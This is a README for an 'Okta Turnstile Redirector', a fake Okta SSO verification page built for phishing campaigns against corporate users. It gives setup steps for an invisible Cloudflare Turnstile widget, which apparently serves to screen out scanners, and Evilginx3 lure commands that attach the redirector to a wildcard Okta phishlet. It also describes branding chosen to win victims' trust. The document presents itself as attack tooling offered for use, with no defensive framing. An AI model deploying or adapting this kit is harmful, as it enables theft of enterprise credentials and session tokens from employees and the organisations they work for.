# Okta Turnstile Redirector

## Overview

Enterprise SSO security verification page with Okta branding for phishing campaigns targeting corporate environments.

## Setup Instructions

### 1. Create Cloudflare Turnstile Site

1. Go to https://dash.cloudflare.com/?to=/:account/turnstile
2. Create new site with **Invisible** widget mode
3. Copy the Site Key

### 2. Configure Redirector

Edit `index.html` line 160:
```javascript
const TURNSTILE_SITEKEY = 'YOUR_SITE_KEY';
```

### 3. Evilginx3 Configuration

```
lures create okta
lures edit 0 redirector okta_turnstile
lures edit 0 path /verify
lures get-url 0
```

## Features

- Professional Okta branding (#007DC1)
- Enterprise security messaging
- Clean, corporate design
- Lock icon for trust indication
- Fully responsive

## Notes

This redirector works with the generic Okta phishlet that supports any organization's Okta instance (*.okta.com wildcard). The enterprise-focused messaging helps build trust with corporate users.

